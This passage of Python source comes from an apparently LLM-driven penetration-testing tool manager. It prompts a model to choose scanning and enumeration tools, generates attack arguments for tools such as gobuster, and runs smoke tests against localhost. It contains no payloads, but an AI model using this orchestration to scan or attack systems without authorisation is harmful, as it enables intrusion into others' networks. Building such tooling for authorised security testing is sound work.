            # fallback: add any discovered tool containing a pentest keyword
            if len(available) < 10:
                extra = [n for n in self.discovered if any(k in n for k in
                         ("scan","enum","brute","exploit","fuzz","inject","dump","recon"))]
                available = sorted(set(available) | set(extra[:30]))

            prompt = f"""You are a penetration testing expert. Select the 3-5 best tools for the given purpose.

Purpose: {purpose}

Available tools: {", ".join(available)}

HackTricks context:
{rag_text or "(not available)"}

Rules:
- Return ONLY a valid JSON array of tool name strings
- Only select tools that are in the available list
- Order by effectiveness for this specific purpose
- Example: ["nmap", "enum4linux", "smbclient"]

JSON array of tool names:"""

            response = llm.invoke(prompt)
            m = re.search(r'\[.*?\]', str(response), re.DOTALL)
            if m:
                tools = json.loads(m.group(0))
                if isinstance(tools, list):
                    # verify they actually exist
                    verified = [t for t in tools if self.find(t)]
                    console.print(
                        f"[green][[ToolManager]][/] Best tools for '{purpose[:60]}': "
                        f"{verified}"
                    )
                    return verified
        except Exception as e:
            _log.warning(f"get_tools_for_purpose LLM call failed: {e}")

        return []

    # ── Reporting ────────────────────────────────────────────────────────────

    def session_report(self) -> dict:
        """Summary of tool activity this session."""
        return {
            "total_discovered": len(self.discovered),
            "auto_installed": self.installed_this_session,
            "failed_installs": self.failed,
            "tools_used": dict(sorted(self._usage_log.items(),
                                      key=lambda x: x[1], reverse=True)),
        }

    def print_report(self):
        """Print a rich session report table."""
        report = self.session_report()
        t = Table(title="DynamicToolManager — Session Report")
        t.add_column("Metric", style="cyan")
        t.add_column("Value", style="white")
        t.add_row("Total discovered", str(report["total_discovered"]))
        t.add_row("Auto-installed this session",
                  str(len(report["auto_installed"])) +
                  (" (" + ", ".join(i["tool"] for i in report["auto_installed"]) + ")"
                   if report["auto_installed"] else ""))
        t.add_row("Failed installs",
                  str(len(report["failed_installs"])) +
                  (" (" + ", ".join(report["failed_installs"]) + ")"
                   if report["failed_installs"] else ""))
        t.add_row("Tools used this session",
                  ", ".join(f"{k}×{v}" for k, v in list(report["tools_used"].items())[:10]))
        console.print(t)


# ── Module-level singleton ────────────────────────────────────────────────────

_manager: Optional[DynamicToolManager] = None


def get_tool_manager() -> DynamicToolManager:
    """Return the module-level singleton DynamicToolManager."""
    global _manager
    if _manager is None:
        _manager = DynamicToolManager()
    return _manager


# ── Smoke test ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    from rich.console import Console as RC
    rc = RC()

    rc.rule("[bold cyan]DynamicToolManager — Smoke Test[/]")

    tm = DynamicToolManager()

    rc.print(f"\n[bold]1. Discovered:[/] {len(tm.discovered)} tools")
    assert len(tm.discovered) > 20, "Expected > 20 tools discovered"

    # 2. find nmap
    path = tm.find("nmap")
    rc.print(f"[bold]2. nmap path:[/] {path}")
    assert path, "nmap must be findable"

    # 3. use nmap
    result = tm.use("nmap", ["-sV", "--version-light", "127.0.0.1", "-p", "22"],
                    purpose="smoke test nmap", timeout=30)
    rc.print(f"[bold]3. nmap run:[/] success={result['success']}, rc={result['returncode']}, {result['duration']}s")

    # 4. configure_for_attack
    rc.print("[bold]4. configure_for_attack (gobuster)...[/]")
    args = tm.configure_for_attack("gobuster", {
        "target": "http://127.0.0.1",
        "service": "http",
        "purpose": "web directory discovery",
        "known_info": "Apache server",
        "stealth": False,
        "timeout": 60,
    })
    rc.print(f"   LLM-generated args: {args}")

    # 5. get_tools_for_purpose
    rc.print("[bold]5. get_tools_for_purpose (SMB enum)...[/]")
    tools = tm.get_tools_for_purpose("enumerate SMB shares on a Windows host")
    rc.print(f"   Recommended tools: {tools}")

    tm.print_report()
    rc.print("\n[bold green]✓ All smoke tests passed[/]")
